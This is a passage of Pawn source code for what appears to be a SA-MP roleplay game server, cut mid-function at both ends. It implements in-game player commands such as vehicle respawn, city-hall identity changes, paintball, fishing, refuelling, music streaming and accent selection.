		    AddVehicleComponent(Player[playerid][pVVeh], Player[playerid][pVVehMod][i]);
		}
	}
	else if(GetPlayerVehicleID(playerid) == Player[playerid][pVVVeh])
	{
		for(new i=0; i<14; i++)
		{
		    Player[playerid][pVVVehMod][i] = GetVehicleComponentInSlot(Player[playerid][pVVVeh], i);
		}
		GetVehiclePos(Player[playerid][pVVVeh],Player[playerid][vVVX], Player[playerid][vVVY], Player[playerid][vVVZ]);
		GetVehicleZAngle(Player[playerid][pVVVeh],Player[playerid][vVVA]);
		DestroyVehicle(Player[playerid][pVVVeh]);
		Player[playerid][pVVVeh] = CreateVehicle(Player[playerid][vVVModel], Player[playerid][vVVX], Player[playerid][vVVY], Player[playerid][vVVZ],Player[playerid][vVVA],Player[playerid][vVVC1],Player[playerid][vVVC2],1200);
	    ChangeVehiclePaintjob(Player[playerid][pVVVeh], Player[playerid][vVVPJ]);
		for(new i=0; i<14; i++)
		{
		    AddVehicleComponent(Player[playerid][pVVVeh], Player[playerid][pVVVehMod][i]);
		}
	}
	else if(GetPlayerVehicleID(playerid) == Player[playerid][pVVVVeh])
	{
		for(new i=0; i<14; i++)
		{
		    Player[playerid][pVVVVehMod][i] = GetVehicleComponentInSlot(Player[playerid][pVVVVeh], i);
		}
		GetVehiclePos(Player[playerid][pVVVVeh],Player[playerid][vVVVX], Player[playerid][vVVVY], Player[playerid][vVVVZ]);
		GetVehicleZAngle(Player[playerid][pVVVVeh],Player[playerid][vVVVA]);
        DestroyVehicle(Player[playerid][pVVVVeh]);
		Player[playerid][pVVVVeh] = CreateVehicle(Player[playerid][vVVVModel], Player[playerid][vVVVX], Player[playerid][vVVVY], Player[playerid][vVVVZ],Player[playerid][vVVVA],Player[playerid][vVVVC1],Player[playerid][vVVVC2],1200);
	    ChangeVehiclePaintjob(Player[playerid][pVVVVeh], Player[playerid][vVVVPJ]);
		for(new i=0; i<14; i++)
		{
		    AddVehicleComponent(Player[playerid][pVVVVeh], Player[playerid][pVVVVehMod][i]);
		}
	}
	return 1;
}
IRP:getlicense(playerid, var[])
{
    if(!IsPlayerInRangeOfPoint(playerid, 2, 1959.3208,-1129.9222,987.5298)) return SendClientMessage(playerid, COLOR_GRAD2, "You are not at the department motor vehicle's desk.");
	ShowDialog(playerid, 26);
	return 1;
}
IRP:namechange(playerid, var[])
{
   	if(!Logged(playerid)) return NoLogin(playerid);
   	if(Player[playerid][pMoney] < Player[playerid][pLevel] * -1200) return SendClientMessage(playerid, COLOR_GRAD2, "You can't afford to change your name.");
   	if(NameRequester == playerid) return SendClientMessage(playerid, COLOR_GRAD2, "You've already requested a namechange.");
	if(!IsPlayerInRangeOfPoint(playerid, 2, 361.8299,173.3985,1008.3828)) return SendClientMessage(playerid, COLOR_GRAD2, "You are not at the cityhall service.");
	SendClientMessage(playerid, COLOR_WHITE, "** It will cost you $1200 per level.");
	ShowDialog(playerid, 32);
	return 1;
}
IRP:agechange(playerid, var[])
{
    new string[128], amount;
   	if(!Logged(playerid)) NoLogin(playerid);
   	if(sscanf(var, "i", amount))
    {
    	SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /agechange [18-80]");
     	SendClientMessage(playerid, COLOR_WHITE, "** It will cost you $1200 per level.");
     	return 1;
    }
    if(Player[playerid][pMoney] < Player[playerid][pLevel] * -1200) return SendClientMessage(playerid, COLOR_GRAD2, "You can't afford to change your age.");
	if(!IsPlayerInRangeOfPoint(playerid, 2, 361.8711,173.8035,1008.3828)) return SendClientMessage(playerid, COLOR_GRAD2, "You are not at the cityhall service.");
	if(amount < 18 || amount > 80) return SendClientMessage(playerid, COLOR_GRAD2, "You've entered an invalid age.");
    Player[playerid][pAge] = amount;
	GiveZamoraMoney(playerid, Player[playerid][pLevel] * -1200);
    format(string, sizeof(string), "You've changed your Age to %d, and you've been charged %d for it", amount, Player[playerid][pLevel] * 1200);
	SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
	return 1;
}
IRP:sexchange(playerid, var[])
{
    new string[128], sex, string1[128];
   	if(!Logged(playerid)) return NoLogin(playerid);
   	if(sscanf(var, "i", sex))
    {
    	SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /sexchange [1-Male / 2-Female]");
    	SendClientMessage(playerid, COLOR_WHITE, "** It will cost you $1200 per level.");
    	return 1;
	}
	if(Player[playerid][pMoney] < Player[playerid][pLevel] * -1200) return SendClientMessage(playerid, COLOR_GRAD2, "You can't afford to change your gender.");
	if(!IsPlayerInRangeOfPoint(playerid, 2, 361.8711,173.8035,1008.3828)) return SendClientMessage(playerid, COLOR_GRAD2, "You are not at the cityhall service.");
	if(sex < 1 || sex > 2) return SendClientMessage(playerid, COLOR_GRAD2, "You've entered an invalid gender.");
	if(sex == 1) format(string, sizeof(string), "Male");
    else if(sex == 2) format(string, sizeof(string), "Female");
	GiveZamoraMoney(playerid, Player[playerid][pLevel] * -1200);
	SetPlayerGender(playerid, sex);
    format(string1, sizeof(string1), "You've changed your Gender to %s, and you've been charged %d for it", string, Player[playerid][pLevel] * 1200);
	SendClientMessage(playerid, COLOR_LIGHTBLUE, string1);
	return 1;
}
IRP:phchange(playerid, var[])
{
	new string[128], number, File:file = fopen("cellphones.cfg", io_read);
   	if(!Logged(playerid)) return NoLogin(playerid);
   	//if(Player[playerid][pMoney] < Player[playerid][pLevel] * -1200) return SendClientMessage(playerid, COLOR_GRAD2, "You can't afford to change your gender.");
	if(!Player[playerid][pHasCellphone]) return SendClientMessage(playerid, COLOR_GRAD2, "You don't own a cellphone to buy a simcard.");
	if(!IsPlayerInRangeOfPoint(playerid, 2, 361.8711,173.8035,1008.3828)) return SendClientMessage(playerid, COLOR_GRAD2, "You are not at the cityhall service.");
	if(sscanf(var, "i", number))
	{
    	SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /phchange [number]");
    	SendClientMessage(playerid, COLOR_WHITE, "** It'll be free for the first time, and it will cost you $1200 per level after that.");
    	return 1;
	}
	if(Player[playerid][pVIP] <= 1)
	{
		 if(number < 1000 || number > 999999999) return SendClientMessage(playerid, COLOR_GRAD2, "[ERROR]: Numbers are between 1000 to 999999999.");
	}
	if(Player[playerid][pVIP] == 2)
	{
		 if(number < 100 || number > 999999999) return SendClientMessage(playerid, COLOR_GRAD2, "[ERROR]: Numbers are between 100 to 999999999.");
	}
	if(Player[playerid][pVIP] >= 3)
	{
		 if(number < 1 || number > 999999999) return SendClientMessage(playerid, COLOR_GRAD2, "[ERROR]: Numbers are between 1 to 999999999.");
	}
	if(Player[playerid][pPhone] == number) return SendClientMessage(playerid, COLOR_GRAD2, "[ERROR]: You've already this number as yours.");
	new idx = 1;
	while(fread(file, string))
	{
	    if(strval(string) == number) return SendClientMessage(playerid, COLOR_GRAD2, "[ERROR]: The number you've choosed is already in use.");
	    if(strval(string) == Player[playerid][pPhone])
	    {
			fdeleteline("cellphones.cfg", idx);
	    }
	    idx ++;
	}
	fclose(file);
	file = fopen("cellphones.cfg", io_append);
	format(string, sizeof(string), "%d\r\n", number);
	fwrite(file, string);
	fclose(file);
	if(!Player[playerid][pPhone])
	{
	    SendClientMessage(playerid, COLOR_WHITE, "** You have successfully changed your phone number for free as it's the first time.");
	}
	else
	{
        if(Player[playerid][pMoney] < Player[playerid][pLevel] * -1200) return SendClientMessage(playerid, COLOR_GRAD2, "You can't afford to change your phone.");
		GiveZamoraMoney(playerid, Player[playerid][pLevel] * -1200);
		TaxMoney += 500;
        format(string, sizeof(string), "** You've changed your number and you've been charged $%d.", Player[playerid][pLevel] * 1200);
		SendClientMessage(playerid, COLOR_WHITE, string);
	}
	Player[playerid][pPhone] = number;
	return 1;
}
IRP:startpb(playerid, var[])
{
	new weapon;
	if(!IsPlayerInRangeOfPoint(playerid, 2, 1310.1110,-1368.5656,13.517786)) return SendClientMessage(playerid, COLOR_GRAD2, "You're not at the paintball.");
	if(PaintballOn == 1) return SendClientMessage(playerid, COLOR_GRAD2, "There is a paintball game, Use /enterpb instead.");
	if(sscanf(var, "d", weapon))
	{
		SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /startpb [weapons]");
		SendClientMessage(playerid, COLOR_GRAD2, "** [WEAPONS]: 1) Deagle & Spas12 | 2) Deagle & Shotgun");
		return 1;
	}
	switch(weapon)
	{
    	case 1:
		{
            PaintballWep[0] = 24;
            PaintballWep[1] = 27;
            PaintballOn = 1;
            Paintball[playerid] = 1;
            PaintballPlayers += 1;
	        SetPlayerHealth(playerid, 100);
	        SetPlayerArmour(playerid, 100);
	        GetPlayerHealth(playerid, Player[playerid][pHealth]);
         	GetPlayerArmour(playerid, Player[playerid][pArmor]);
        	SetPlayerPos(playerid, 1295.4827,-3.2839,1001.0273);
        	SetPlayerInterior(playerid, 18);
          	SetPlayerVirtualWorld(playerid, 0);
        	for(new i=0; i<13; i++)
        	{
	         	GetPlayerWeaponData(playerid, i, Player[playerid][pWeapon][i], Player[playerid][pWeaponAmmo][i]);
         	}
        	GunsBeingRemoved[playerid] = 1;
        	ResetPlayerWeapons(playerid);
        	GiveZamoraWeapon(playerid, 24, 999999);
	        GiveZamoraWeapon(playerid, 27, 999999);
        	SendClientMessage(playerid, COLOR_LIGHTRED, "** You've joined the paintball game, Use /quitpb to leave at any time.");
        	SendClientMessage(playerid, COLOR_LIGHTRED, "** Your original health, armor and weapons will be refunded once the game is ended, or you leave the paintball.");
        	SetTimer("Paintballtime", 900000, true);
		}
		case 2:
		{
            PaintballWep[0] = 24;
            PaintballWep[1] = 25;
            PaintballOn = 1;
            Paintball[playerid] = 1;
            PaintballPlayers += 1;
	        SetPlayerHealth(playerid, 100);
	        SetPlayerArmour(playerid, 100);
	        GetPlayerHealth(playerid, Player[playerid][pHealth]);
         	GetPlayerArmour(playerid, Player[playerid][pArmor]);
        	SetPlayerPos(playerid, 1295.4827,-3.2839,1001.0273);
        	SetPlayerInterior(playerid, 18);
          	SetPlayerVirtualWorld(playerid, 0);
        	for(new i=0; i<13; i++)
        	{
	         	GetPlayerWeaponData(playerid, i, Player[playerid][pWeapon][i], Player[playerid][pWeaponAmmo][i]);
         	}
        	GunsBeingRemoved[playerid] = 1;
        	ResetPlayerWeapons(playerid);
        	GiveZamoraWeapon(playerid, 25, 999999);
	        GiveZamoraWeapon(playerid, 27, 999999);
        	SendClientMessage(playerid, COLOR_LIGHTRED, "** You've joined the paintball game, Use /quitpb to leave at any time.");
        	SendClientMessage(playerid, COLOR_LIGHTRED, "** Your original health, armor and weapons will be refunded once the game is ended, or you leave the paintball.");
        	SetTimer("Paintballtime", 900000, true);
		}
	}
	return 1;
}
IRP:enterpb(playerid, var[])
{
   	if(!Logged(playerid)) return NoLogin(playerid);
   	if(!IsPlayerInRangeOfPoint(playerid, 2, 1310.1110,-1368.5656,13.517786)) return SendClientMessage(playerid, COLOR_GRAD2, "You're not at the paintball.");
   	if(IsPlayerTazed(playerid) && IsPlayerCuffed(playerid) && IsPlayerTied(playerid)) return SendClientMessage(playerid, COLOR_GRAD2, "You are not allowed to enter paintball at the moment");
    if(Paintball[playerid]) return SendClientMessage(playerid, COLOR_GRAD2, "You are already in the paintball.");
	if(PaintballOn == 1)
	{
    	GetPlayerHealth(playerid, Player[playerid][pHealth]);
    	GetPlayerArmour(playerid, Player[playerid][pArmor]);
    	SetPlayerPos(playerid, 1295.4827,-3.2839,1001.0273);
    	SetPlayerInterior(playerid, 18);
    	SetPlayerVirtualWorld(playerid, 0);
    	for(new i=0; i<13; i++)
    	{
	    	GetPlayerWeaponData(playerid, i, Player[playerid][pWeapon][i], Player[playerid][pWeaponAmmo][i]);
    	}
    	GunsBeingRemoved[playerid] = 1;
    	ResetPlayerWeapons(playerid);
    	Paintball[playerid] = 1;
    	PaintballPlayers += 1;
    	GiveZamoraWeapon(playerid, PaintballWep[0], 999999);
	    GiveZamoraWeapon(playerid, PaintballWep[1], 999999);
        SetPlayerHealth(playerid, 100);
        SetPlayerArmour(playerid, 100);
    	SendClientMessage(playerid, COLOR_LIGHTRED, "** You've joined the paintball game, Use /quitpb to leave at any time.");
    	SendClientMessage(playerid, COLOR_LIGHTRED, "** Your original health, armor and weapons will be refunded once the game is ended, or you leave the paintball.");
    }
    else
    {
		SendClientMessage(playerid, COLOR_GRAD2, "There is no paintball game, Use /startpb instead.");
	}
	return 1;
}

IRP:quitpb(playerid, var[])
{
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(!Paintball[playerid]) return SendClientMessage(playerid, COLOR_GRAD2, "You are not inside the paintball.");
	Paintball[playerid] = 0;
	PaintballPlayers -= 1;
    SetPlayerPos(playerid, 1310.1110,-1368.5656,13.517786);
	SetPlayerInterior(playerid, 0);
	SetPlayerVirtualWorld(playerid, 0);
	SetPlayerHealth(playerid, Player[playerid][pHealth]);
	SetPlayerArmour(playerid, Player[playerid][pArmor]);
	SendClientMessage(playerid, COLOR_LIGHTRED, "** You have quitted the paintball.");
	GunsBeingRemoved[playerid] = 1;
	ResetPlayerWeapons(playerid);
	GunsBeingRemoved[playerid] = 1;
	for(new w = 0; w < 13; w++)
	{
	    GiveZamoraWeapon(playerid, Player[playerid][pWeapon][w], Player[playerid][pWeaponAmmo][w]);
	}
	if(PaintballPlayers == 0)
	{
         SetTimer("Paintballtime", 1, true);
    }
	return 1;
}
IRP:walkstyle(playerid, var[])
{
	new
		iSuccess;
	switch(strval(var))
	{
		case 1: { SetPlayerWalkingStyle(playerid, 0); iSuccess++; }
		case 2: { SetPlayerWalkingStyle(playerid, 3); iSuccess++; }
		case 3: { SetPlayerWalkingStyle(playerid, 4); iSuccess++; }
		case 4: { SetPlayerWalkingStyle(playerid, 5); iSuccess++; }
		case 5: { SetPlayerWalkingStyle(playerid, 6); iSuccess++; }
		case 6: { SetPlayerWalkingStyle(playerid, 8); iSuccess++; }
		case 7: { SetPlayerWalkingStyle(playerid, 9); iSuccess++; }
		case 8: { SetPlayerWalkingStyle(playerid, 10); iSuccess++; }
		case 9: { SetPlayerWalkingStyle(playerid, 11); iSuccess++; }
		case 10: { SetPlayerWalkingStyle(playerid, 12); iSuccess++; }
		case 11: { SetPlayerWalkingStyle(playerid, 13); iSuccess++; }
		default: SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /walkstyle [1-11]");
	}
	if(iSuccess > 0) SendClientMessage(playerid, COLOR_WHITE, "You've successfully changed your walkstyle.");
	return 1;
}
IRP:aplay(playerid, var[])
{
	if(Player[playerid][pAdmin] >= 2)
	{
    	if(isnull(var)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /aplay [song name]");
     	new string[128]; format(string, sizeof(string), "http://game.us-roleplay.com/music/%s.mp3", var[0] );
      	for(new i=0;i<MAX_PLAYERS;i++) PlayAudioStreamForPlayer(i,string);
     	SendClientMessageToAll(COLOR_LIGHTRED, "A administrator has started a global playback. /stopmusic to stop it");
    }
    else
    {
		NoAuth(playerid);
	}
 	return 1;
}
IRP:play(playerid, var[])
{
	if(Player[playerid][pCDPlayer] == 0) return SendClientMessage(playerid, COLOR_WHITE, "You don't have a MP3 Player, go buy one from a 24/7");
	if(Player[playerid][pCDPlayer] == 1)
	{
		if(isnull(var)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /play [song name]");
		new string[128]; format(string, sizeof(string), "http://game.us-roleplay.com/music/%s.mp3", var[0] );
		PlayAudioStreamForPlayer(playerid, string);
		return 1;
	}
	return 1;
}
IRP:radio(playerid, var[])
{
	if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
	if(isnull(var)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /radio (song name)");
	new string[128]; format(string, sizeof(string), "http://game.us-roleplay.com/music/%s.mp3", var[0] );
	if(IsPlayerInAnyVehicle(playerid))
	{
    	PlayAudioStreamForPlayer(playerid, string);
    	return 1;
    }
	return 1;
}
IRP:sellfishes(playerid, var[])
{
	new idx = GetPlayerVirtualWorld(playerid)-100, string[128], fishes;
	if(!Logged(playerid)) return NoLogin(playerid);
	if(idx > 0 && idx < MAX_BIZ && BizInfo[idx][bType] != 1 || idx < 1 || idx > MAX_BIZ) return SendClientMessage(playerid, COLOR_GRAD2, "You are not able to complete this action as, you are not inside any market.");
    for(new i=0; i<5; i++)
	{
        fishes += Player[playerid][pFish][i];
    	Player[playerid][pFish][i] = 0;
    }
    GiveZamoraMoney(playerid, fishes * 2);
    format(string, sizeof(string), "* %s has sold his fishes to the Market.", GetName(playerid));
   	SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
    format(string, sizeof(string), "* You have sold your fishes with {FF6347}%d lbs {33CCFF}for {FF6347}$%d{33CCFF}.", fishes, fishes*2);
   	SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
	return 1;
}
IRP:fishes(playerid, var[])
{
	new string[128];
	SendClientMessage(playerid, COLOR_LIGHTBLUE, "|____ Your caughted fishes ____|");
	for(new i=0; i<5; i++)
	{
		if(Player[playerid][pFish][i]) format(string, sizeof(string), "* %d) %d lbs.", i+1, Player[playerid][pFish][i]);
		else format(string, sizeof(string), "* {00C0FF}%d{FFFFFF}) None.", i+1);
		SendClientMessage(playerid, COLOR_WHITE, string);
	}
	return 1;
}
IRP:fish(playerid, var[])
{
	new string[128], done, fish;
   	if(!Logged(playerid)) return NoLogin(playerid);
   	if(!Player[playerid][pFishLic]) return SendClientMessage(playerid, COLOR_GRAD2, "You are not able to fish as you don't have a fishing license.");
	if(!IsAtFishingSWeed(playerid)) return SendClientMessage(playerid, COLOR_GRAD2, "You are not at a fishing sWeed.");
	if(FishTime[playerid])
	{
	    format(string, sizeof(string), "You need to wait %d more seconds before fishing again.", FishTime[playerid]);
		SendClientMessage(playerid, COLOR_GRAD2, string);

	    return 1;
	}
	for(new i=0; i<5; i++) // Fish
	{
	    if(!done)
	    {
		    if(!Player[playerid][pFish][i]) done = i+1;
	    }
	}
	if(!done) return SendClientMessage(playerid, COLOR_GRAD2, "You've caught the maximum fish number.");
	done = done-1;
	// Catching
	if(strval(RPJL(playerid, JOB_FISHER)) == 1) fish = random(25)+100;
	else if(strval(RPJL(playerid, JOB_FISHER)) == 2) fish = random(30)+150;
	else if(strval(RPJL(playerid, JOB_FISHER)) == 3) fish = random(40)+200;
	else if(strval(RPJL(playerid, JOB_FISHER)) == 4) fish = random(60)+250;
	else if(strval(RPJL(playerid, JOB_FISHER)) == 5) fish = random(80)+300;
	Player[playerid][pFish][done] = fish;
	format(string, sizeof(string), "** %s throws his fishing rod attemping to catch a fish.", GetName(playerid));
 	SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
	format(string, sizeof(string), " You have caught a %d lbs fish.", fish);
	SendClientMessage(playerid, COLOR_YELLOW, string);
	// Leveling
    new oldj = strval(RPJL(playerid, JOB_FISHER));
    Player[playerid][pJobSkill][JOB_FISHER] ++;
	new newj = strval(RPJL(playerid, JOB_FISHER));
    if(oldj < newj)
	{
	    format(string, sizeof(string), "** Your Fisher level is now %d, you can now catch heavier fishes.", newj);
		SendClientMessage(playerid, COLOR_YELLOW, string);
	}
	Fished[playerid] ++;
	if(Fished[playerid] >= 5)
	{
		Fished[playerid] = 0;
		FishTime[playerid] = 60*5;
		SetTimerEx("FishingTime", 1000, false, "i", playerid);
	}
	return 1;
}

IRP:train(playerid, var[])
{
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(!IsPlayerInRangeOfPoint(playerid, 2, 757.1003,5.9849,1000.7007)) return SendClientMessage(playerid, COLOR_GRAD2, "You are not able to train, as you are not near the training sWeed inside the gym.");
	ShowDialog(playerid, 22);
	return 1;
}

IRP:tow(playerid, var[])
{
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(!IsATowTruck(GetPlayerVehicleID(playerid))) return SendClientMessage(playerid, COLOR_GRAD2, "You are not driving a tow truck.");
    if (IsTrailerAttachedToVehicle(GetPlayerVehicleID(playerid))) SendClientMessage(playerid, COLOR_GRAD2, "You are already towing a vehicle.");
    new Float:PPPX,Float:PPPY,Float:PPPZ;
    GetPlayerPos(playerid,PPPX,PPPY,PPPZ);
    new Float:VVVX,Float:VVVY,Float:VVVZ;
    new Found=0;
    new vid=0;
    while((vid<MAX_VEHICLES)&&(!Found))
    {
    	vid++;
        GetVehiclePos(vid,VVVX,VVVY,VVVZ);
        if  ((floatabs(PPPX-VVVX)<7.0)&&(floatabs(PPPY-VVVY)<7.0)&&(floatabs(PPPZ-VVVZ)<7.0)&&(vid!=GetPlayerVehicleID(playerid)))
        {
        	Found=1;
            AttachTrailerToVehicle(vid,GetPlayerVehicleID(playerid));
        }

    }
    if  (!Found)
    {
		SendClientMessage(playerid, COLOR_GRAD2, "You are not near a tow-able vehicle.");
    }
    return 1;
}

IRP:refill(playerid, var[])
{
	new string[128];
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(!Player[playerid][pGas]) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have a gas can, Get one from any market.");
	if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendClientMessage(playerid, COLOR_GRAD2, "You are not in the driver seat, You are not able to use it.");
    new vehicleid = GetPlayerVehicleID(playerid);
    if(Fuel[vehicleid] >= 150) return SendClientMessage(playerid, COLOR_GRAD2, "The gas tank of this vehicle is already full.");
	SetVehicleParamsEx(vehicleid, 0, 0, 0, 0, 0, 0, 0);
	Fuel[vehicleid] = Fuel[vehicleid]+20;
	if(Fuel[vehicleid]> 150) Fuel[vehicleid] = 150;
	Player[playerid][pGas] --;
	format(string, sizeof(string), "* %s turns off the vehicle's engine and fills its tank with gas from a can.", GetName(playerid));
	SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
	return 1;
}

IRP:fill(playerid, var[])
{
	new string[128];
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendClientMessage(playerid, COLOR_GRAD2, "You are not in the driver seat.");
	if(!IsPlayerInRangeOfPoint(playerid, 5, 1941.7532,-1776.3621,13.6406) && !IsPlayerInRangeOfPoint(playerid, 5, 1941.7856,-1769.2583,13.6406)
	&& !IsPlayerInRangeOfPoint(playerid, 5, 1000.4276,-937.2377,42.3281) && !IsPlayerInRangeOfPoint(playerid, 5, 1007.4702,-936.3239,42.3281)
	&& !IsPlayerInRangeOfPoint(playerid, 5, 1464.5323,-1666.2052,13.3800) && !IsPlayerInRangeOfPoint(playerid, 5, 1007.4443,-937.6319,42.1797)
	&& !IsPlayerInRangeOfPoint(playerid, 5, 1000.4910,-939.4183,42.1797) && !IsPlayerInRangeOfPoint(playerid, 5, 1001.3085,-936.0330,42.1797)
	&& !IsPlayerInRangeOfPoint(playerid, 5, 1008.5973,-934.8140,42.1797) && !IsPlayerInRangeOfPoint(playerid, 5, 654.3603,-570.5966,16.3359)
	&& !IsPlayerInRangeOfPoint(playerid, 5, 654.1937,-559.7492,16.3359) && !IsPlayerInRangeOfPoint(playerid, 5, 604.4550,1705.6422,6.9922)
	&& !IsPlayerInRangeOfPoint(playerid, 5, 618.0097,1686.3531,6.9922) && !IsPlayerInRangeOfPoint(playerid, 5, 602.7443,1708.6790,6.9922)
	&& !IsPlayerInRangeOfPoint(playerid, 5, -1664.1851,415.4981,7.1797) && !IsPlayerInRangeOfPoint(playerid, 5, -2245.2349,-2560.0076,31.9219)
	&& !IsPlayerInRangeOfPoint(playerid, 5, -86.5844,-1164.0844,2.2297) && !IsPlayerInRangeOfPoint(playerid, 5, -95.9800,-1173.8165,2.3461)
	&& !IsPlayerInRangeOfPoint(playerid, 5, -91.4270,-1174.2136,2.2625) && !IsPlayerInRangeOfPoint(playerid, 5, -91.3424,-1162.6239,2.2687)
	&& !IsPlayerInRangeOfPoint(playerid, 5, 656.6210,-570.4465,16.3359) && !IsPlayerInRangeOfPoint(playerid, 5, 2113.4106,913.4892,10.8203))
	{
	    SendClientMessage(playerid, COLOR_GRAD2, "You are not near any gas station.");
	    return 1;
	}
	if(Fuel[GetPlayerVehicleID(playerid)] >= 100) return SendClientMessage(playerid, COLOR_GRAD2, "Your vehicle's fuel tank is full.");
	if(Player[playerid][pMoney] <= 0) return SendClientMessage(playerid, COLOR_GRAD2, "You are not able to refill it as you don't money.");
    new vehicleid = GetPlayerVehicleID(playerid);
	SetVehicleParamsEx(vehicleid, 0, 0, 0, 0, 0, 0, 0);
	if(GetPlayerVehicleID(playerid) == Player[playerid][pVeh])
    {SetVehicleParamsEx(vehicleid, 0, 0, 0, Player[playerid][vLocked], 0, 0, 0);}
    if(GetPlayerVehicleID(playerid) == Player[playerid][pVVeh])
    {SetVehicleParamsEx(vehicleid, 0, 0, 0, Player[playerid][vVLocked], 0, 0, 0);}
    if(GetPlayerVehicleID(playerid) == Player[playerid][pVVVeh])
    {SetVehicleParamsEx(vehicleid, 0, 0, 0, Player[playerid][vVVLocked], 0, 0, 0);}
    if(GetPlayerVehicleID(playerid) == Player[playerid][pVVVVeh])
    {SetVehicleParamsEx(vehicleid, 0, 0, 0, Player[playerid][vVVVLocked], 0, 0, 0);}
    format(string, sizeof(string), "* %s turns the vehicle's engine off and starts refilling it.", GetName(playerid));
	SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
	SetTimerEx("RefillTimer", 1000, false, "i", playerid);
	return 1;
}

IRP:kill(playerid, var[])
{
   	if(!Logged(playerid)) return NoLogin(playerid);
   	if(IsPlayerCuffed(playerid) ||  IsPlayerInAnyVehicle(playerid) || IsPlayerTied(playerid) || Player[playerid][pDead] || Player[playerid][pJail] || Player[playerid][pPrison])
	{
	    SendClientMessage(playerid, COLOR_GRAD2, "You can't do this right now.");
	    return 1;
	}
   	if(!IsPlayerTazed(playerid) && !IsPlayerCuffed(playerid) && !IsPlayerTied(playerid))
   	{
     	SetPlayerHealth(playerid, 0);
    }
    else
    {
		SendClientMessage(playerid, COLOR_GRAD2, "You are not able to use this command as you're Tazed, Cuffed, or Tied.");
	}
   	return 1;
}

IRP:accent(playerid, var[])
{
	new accent;
	if(sscanf(var, "d", accent))
	{
		SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /accent [accent ID]");
		SendClientMessage(playerid, COLOR_GRAD2, "** [Available Accents]: None [1], British [2], Asian [3], Scottish [4], Irish [5], Russian [6], American [7]");
		SendClientMessage(playerid, COLOR_GRAD2, "** [Available Accents]: Spanish [8], Southern [9], Cuban [10], Italian [11], Afro-American [12], Australian [13]");
		SendClientMessage(playerid, COLOR_GRAD2, "** [Available Accents]: Arabic [14], Balkan [15], Canadian [16], Jamaican [17], Israeli [18], Indian [19]");
        SendClientMessage(playerid, COLOR_GRAD2, "** [Available Accents]: Welsh [20], French [21], German [22], Dutch [23]");
		return 1;
	}
	switch(accent)
	{
    	case 1:
		{
			format(Player[playerid][pAccent], 16, "");
			SendClientMessage(playerid, COLOR_WHITE, "You've successfully removed your accent.");
		}
    	case 2:
		{
			format(Player[playerid][pAccent], 16, "British");
			SendClientMessage(playerid, COLOR_WHITE, "You will now speak in the British accent, use /accent to change it.");
		}
    	case 3:
		{
			format(Player[playerid][pAccent], 16, "Asian");
			SendClientMessage(playerid, COLOR_WHITE, "You will now speak in the Asian accent, use /accent to change it.");
		}
    	case 4:
		{
			format(Player[playerid][pAccent], 16, "Scottish");
			SendClientMessage(playerid, COLOR_WHITE, "You will now speak in the Scottish accent, use /accent to change it.");
		}
    	case 5:
		{
			format(Player[playerid][pAccent], 16, "Irish");
			SendClientMessage(playerid, COLOR_WHITE, "You will now speak in the Irish accent, use /accent to change it.");
		}
    	case 6:
		{
			format(Player[playerid][pAccent], 16, "Russian");
			SendClientMessage(playerid, COLOR_WHITE, "You will now speak in the Russian accent, use /accent to change it.");
		}
    	case 7:
		{
			format(Player[playerid][pAccent], 16, "American");
			SendClientMessage(playerid, COLOR_WHITE, "You will now speak in the American accent, use /accent to change it.");
		}
    	case 8:
		{
			format(Player[playerid][pAccent], 16, "Spanish");
			SendClientMessage(playerid, COLOR_WHITE, "You will now speak in the Spanish accent, use /accent to change it.");
		}
    	case 9:
		{
			format(Player[playerid][pAccent], 16, "Southern");
			SendClientMessage(playerid, COLOR_WHITE, "You will now speak in the Southern accent, use /accent to change it.");
		}
    	case 10:
		{
			format(Player[playerid][pAccent], 16, "Cuban");
			SendClientMessage(playerid, COLOR_WHITE, "You will now speak in the Cuban accent, use /accent to change it.");
		}
    	case 11:
		{
			format(Player[playerid][pAccent], 16, "Italian");
			SendClientMessage(playerid, COLOR_WHITE, "You will now speak in the Italian accent, use /accent to change it.");
		}
    	case 12:
		{
			format(Player[playerid][pAccent], 16, "Afro-American");
			SendClientMessage(playerid, COLOR_WHITE, "You will now speak in the Afro-American accent, use /accent to change it.");
		}
    	case 13:
		{
			format(Player[playerid][pAccent], 16, "Australian");
			SendClientMessage(playerid, COLOR_WHITE, "You will now speak in the Australian accent, use /accent to change it.");
		}
    	case 14:
		{
			format(Player[playerid][pAccent], 16, "Arabic");
			SendClientMessage(playerid, COLOR_WHITE, "You will now speak in the Arabic accent, use /accent to change it.");
		}
    	case 15:
		{
			format(Player[playerid][pAccent], 16, "Balkan");
			SendClientMessage(playerid, COLOR_WHITE, "You will now speak in the Balkan accent, use /accent to change it.");
		}
    	case 16:
		{
			format(Player[playerid][pAccent], 16, "Canadian");
			SendClientMessage(playerid, COLOR_WHITE, "You will now speak in the Canadian accent, use /accent to change it.");
		}
    	case 17:
		{
			format(Player[playerid][pAccent], 16, "Jamaican");
